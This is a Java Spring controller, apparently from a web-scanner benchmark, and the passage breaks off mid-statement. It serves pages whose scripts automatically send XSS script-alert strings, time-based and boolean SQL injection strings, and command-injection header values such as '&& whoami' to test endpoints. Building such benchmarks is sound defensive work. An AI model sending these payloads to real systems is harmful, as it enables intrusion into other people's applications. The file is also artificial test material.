package com.alipay.antbenchmark.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;

@Controller
@RequestMapping(value = "/")
public class IndexController extends HttpServlet {
    private static final long serialVersionUID = 1L;


    // 提供给爬虫表单形式链接
    @ResponseBody
    @RequestMapping(value = "/index.html", method = {RequestMethod.POST, RequestMethod.GET})
    public void indexHTML(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setContentType("text/html;charset=UTF-8");
        PrintWriter out = response.getWriter();
        StringBuffer sb = new StringBuffer();
        sb.append("<!DOCTYPE html>\n" +
                "<html lang=\"en\">\n" +
                "\n" +
                "<head>\n" +
                "    <meta charset=\"UTF-8\">\n" +
                "    <title>index</title>\n" +
                "</head>\n" +
                "<body>\n" +
                "\n" +
                "<form action=\"/xss/BS00008\" method=\"post\">\n" +
                "    <input type=\"value\" name=\"BS00008\" value='BS00008'>\n" +
                "    <input type=\"submit\" value=\"提交\"/>\n" +
                "</form>\n" +
                "\n" +
                "</body>\n" +
                "</html>");
        out.write(
                sb.toString());
    }

    @ResponseBody
    @RequestMapping(value = "/index", method = {RequestMethod.POST, RequestMethod.GET})
    public void indexAjax(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        // some code
        response.setContentType("text/html;charset=UTF-8");
        PrintWriter out = response.getWriter();
        StringBuffer sb = new StringBuffer();
        sb.append("<!DOCTYPE html>\n" +
                "<html lang=\"en\">\n" +
                "\n" +
                "<head>\n" +
                "    <meta charset=\"UTF-8\">\n" +
                "    <title>ajax请求</title>\n" +
                "</head>\n" +
                "<body>    <script src=\"https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js\"></script>\n" +
                "    <script type=\"text/javascript\">\n" +
                "        var getSec = function(str){\n" +
                "        var str1 = str.substr(0, str.length - 1);  //时间数值 \n" +
                "        var str2 = str.substr(str.length-1, 1);    //时间单位\n" +
                "        if (str2 == \"s\") {\n" +
                "            return str1 * 1000;\n" +
                "        }\n" +
                "        else if (str2 == \"m\") {\n" +
                "            return str1 * 60 * 1000;\n" +
                "        }\n" +
                "        else if (str2 == \"h\") {\n" +
                "            return str1 * 60 * 60 * 1000;\n" +
                "        }\n" +
                "        else if (str2 == \"d\") {\n" +
                "            return str1 * 24 * 60 * 60 * 1000;\n" +
                "        }\n" +
                "    }\n" +
                "        var addCookie = function (name, value, time, path) {\n" +
                "        var strSec = getSec(time);\n" +
                "        var exp = new Date();\n" +
                "        exp.setTime(exp.getTime() + strSec * 1);    \n" +
                "        //设置cookie的名称、值、失效时间\n" +
                "        document.cookie = name + \"=\" + value + \";path=\" + path + \";expires=\"+ exp.toGMTString();  \n" +
                "    }\n" +
                "    </script>\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00028\", \"BS00028\", \"1d\", \"/xss/BS00028\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/xss/BS00028',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00028=<script>alert(1);<\\/script>',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00028\": \"BS00028\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00014\", \"BS00014\", \"1d\", \"/sqli/BS00014\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00014',\n" +
                "                    type: 'POST',\n" +
                "                    data: \"BS00014=1' and (select sleep(10))  or '\",\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00014\": \"BS00014\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00148\", \"BS00148\", \"1d\", \"/sqli/BS00148?BS00148=bar\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00148?BS00148=bar',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00148\": \"BS00148\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00149\", \"BS00149\", \"1d\", \"/sqli/BS00149?BS00149=bar\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00149?BS00149=bar',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00149\": \"BS00149\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00015\", \"BS00015\", \"1d\", \"/xss/BS00015?BS00015=%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3b%3c%2f%73%63%72%69%70%74%3e\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/xss/BS00015?BS00015=%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3b%3c%2f%73%63%72%69%70%74%3e',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00015\": \"BS00015\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00001\", \"BS00001\", \"1d\", \"/pathtraver/BS00001\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/pathtraver/BS00001',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00101\": \"BS00101\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00029\", \"BS00029\", \"1d\", \"/xss/BS00029\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/xss/BS00029',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00029=<script>alert(1);<\\/script>',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00029\": \"BS00029\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00017\", \"BS00017\", \"1d\", \"/xss/BS00017?BS00017=%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3b%3c%2f%73%63%72%69%70%74%3e\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/xss/BS00017?BS00017=%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3b%3c%2f%73%63%72%69%70%74%3e',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00017\": \"BS00017\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00003\", \"BS00003\", \"1d\", \"/xss/BS00003\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/xss/BS00003',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00003\": \"BS00003\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00002\", \"BS00002\", \"1d\", \"/cmdi/BS00002\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00002',\n" +
                "                    type: 'POST',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00002\": \"BS00002 && whoami\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00016\", \"BS00016\", \"1d\", \"/xss/BS00016?BS00016=%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3b%3c%2f%73%63%72%69%70%74%3e\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/xss/BS00016?BS00016=%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3b%3c%2f%73%63%72%69%70%74%3e',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00016\": \"BS00016\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00012\", \"BS00012\", \"1d\", \"/sqli/BS00012\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00012',\n" +
                "                    type: 'POST',\n" +
                "                    data: \"BS00012=bar' and '1'='1\",\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00012\": \"BS00012\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00006\", \"BS00006\", \"1d\", \"/sqli/BS00006\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00006',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00006\": \"1' and (select sleep(10))  or '\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00007\", \"BS00007\", \"1d\", \"/sqli/BS00007\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00007',\n" +
                "                    type: 'POST',\n" +
                "                    data: \"BS00007=bar' and '1'='1\",\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00007\": \"BS00007\"},\n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00013\", \"BS00013\", \"1d\", \"/xss/BS00013\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                data = '<script>alert(1);<\\/script>=BS00013';\n" +
                "                $.ajax({\n" +
                "                    url: '/xss/BS00013',\n" +
                "                    type: 'POST',\n" +
                "                    contentType : 'application/xml;charset=UTF-8',\n" +
                "                    data: data,\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00013\": \"BS00013\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00005\", \"BS00005\", \"1d\", \"/cmdi/BS00005\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00005',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00005\": \"BS00005 && whoami\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n");
        sb.append(
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00011\", \"BS00011\", \"1d\", \"/xss/BS00011\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/xss/BS00011',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00011=<script>alert(1);<\\/script>',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00011\": \"BS00011\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00039\", \"BS00039\", \"1d\", \"/xss/BS00039\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/xss/BS00039',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00039\": \"BS00039\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00038\", \"BS00038\", \"1d\", \"/cmdi/BS00038\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00038',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'whoami=BS00038',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00038\": \"BS00038\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00010\", \"BS00010\", \"1d\", \"/sqli/BS00010\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00010',\n" +
                "                    type: 'POST',\n" +
                "                    data: \"BS00010=bar' and '1'='1\",\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00010\": \"BS00010\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00004\", \"BS00004\", \"1d\", \"/xss/BS00004\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/xss/BS00004',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00004\": \"BS00004\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00063\", \"BS00063\", \"1d\", \"/sqli/BS00063\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00063',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00063=YmFyJyBhbmQgJzEnPScw',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00063\": \"BS00063\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00077\", \"BS00077\", \"1d\", \"/cmdi/BS00077\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00077',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00077=d2hvYW1p',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00077\": \"BS00077\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00088\", \"BS00088\", \"1d\", \"/cmdi/BS00088\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00088',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00088\": \"BS00088\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00103\", \"BS00103\", \"1d\", \"/sensitive/BS00103?BS00103\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sensitive/BS00103?BS00103',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00103\": \"BS00103\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00102\", \"BS00102\", \"1d\", \"/sensitive/BS00102?BS00102\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sensitive/BS00102?BS00102',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00102\": \"BS00102\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00113\", \"BS00113\", \"1d\", \"/sensitive/BS00116\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sensitive/BS00116',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00116\": \"BS00116\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00087\", \"BS00087\", \"1d\", \"/sensitive/BS00089\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sensitive/BS00089',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00007\": '114514\" and sleep(10) and \"'},\n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00076\", \"BS00076\", \"1d\", \"/sqli/BS00076\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00076',\n" +
                "                    type: 'POST',\n" +
                "                    data: \"BS00076=1' AND sleep(5)#\",\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00076\": \"BS00076\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
